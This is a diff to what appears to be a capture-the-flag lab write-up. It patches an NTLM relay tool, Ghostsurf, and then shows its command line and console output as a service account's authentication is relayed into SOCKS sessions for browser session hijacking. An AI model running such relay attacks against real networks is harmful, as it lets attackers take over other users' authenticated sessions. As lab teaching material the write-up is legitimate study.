@@ -506,6 +506,109 @@ ghostsurf> [*] (HTTP): Client requested path: /healthcheck
 [-] (HTTP): Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb failed
 ```
 
+editing config.py
+
+```
+nano lib/relay/utils/config.py 
+```
+
+# Summary
+
+This fixes an `AttributeError` during HTTP NTLM relay caused by a missing `remove_target` attribute in Ghostsurf's vendored `NTLMRelayxConfig`.
+
+# Problem
+
+During relay negotiation, Ghostsurf raised:
+
+`AttributeError: 'NTLMRelayxConfig' object has no attribute 'remove_target'`
+
+The vendored `NTLMRelayxConfig` initializes `remove_mic` but does not initialize `remove_target`, which is expected by the relay server.
+
+# Fix
+
+Initialize the missing `remove_target` attribute in `lib/relay/utils/config.py`:
+
+`self.remove_target = False`
+
+# Verification
+
+After applying this change, relay negotiation completed successfully, authenticated HTTP SOCKS sessions were established, and browser session hijacking proceeded as expected.
+
+
+```
+python3 ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb --keep-relaying --kernel-auth --http-port 8888
+```
+
+```
+
+  ,--,   .-. .-. .---.    .---.  _______  .---. .-. .-.,---.    ,---.
+.' .'    | | | |/ .-. )  ( .-._)|__   __|( .-._)| | | || .-.\   | .-'
+|  |  __ | `-' || | |(_)(_) \     )| |  (_) \   | | | || `-'/   | `-.
+\  \ ( _)| .-. || | | | _  \ \   (_) |  _  \ \  | | | ||   (    | .-'
+ \  `-) )| | |)|\ `-' /( `-'  )    | | ( `-'  ) | `-')|| |\ \   | |
+ )\____/ /(  (_) )---'  `----'     `-'  `----'  `---(_)|_| \)\  )\|
+(__)    (__)    (_)  NTLM relay browser session hijacking  (__)(__)
+
+
+[*] Target: http://gpz-op26-secure.ghostlink.htb
+[*] SOCKS proxy started. Listening on 127.0.0.1:1080
+[*] HTTP Socks Plugin loaded..
+[*] HTTPS Socks Plugin loaded..
+[*] SOCKS proxy: 127.0.0.1:1080
+[*] Kernel-mode auth workaround ENABLED
+[*] Keep-relaying mode ENABLED (will reload targets after success)
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 8888
+ * Serving Flask app 'lib.relay.servers.socksserver'
+ * Debug mode: off
+[*] Setting up WCF Server on port 9389
+
+[*] Servers started, waiting for connections
+Type help for list of commands
+[*] Setting up RAW Server on port 6666
+ghostsurf> [*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
+[*] (HTTP): Client requested path: /healthcheck
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
+[*] SOCKS: Adding GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80) to active SOCKS connection. Enjoy
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] All targets processed!
+[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
+[*] (HTTP): Client requested path: /healthcheck
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [2]
+[*] Relay connection for GHOSTLINK/SVC_CANARY at gpz-op26-secure.ghostlink.htb(80) already exists. Discarding
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] All targets processed!
+[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
+[*] (HTTP): Client requested path: /healthcheck
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [3]
+[*] Relay connection for GHOSTLINK/SVC_CANARY at gpz-op26-secure.ghostlink.htb(80) already exists. Discarding
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] All targets processed!
+[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
+[*] (HTTP): Client requested path: /healthcheck
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [4]
+[*] Relay connection for GHOSTLINK/SVC_CANARY at gpz-op26-secure.ghostlink.htb(80) already exists. Discarding
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] All targets processed!
+[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
+[*] (HTTP): Client requested path: /healthcheck
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [5]
+[*] Relay connection for GHOSTLINK/SVC_CANARY at gpz-op26-secure.ghostlink.htb(80) already exists. Discarding
+
+
+```
+
 ---
 ## Foothold
 
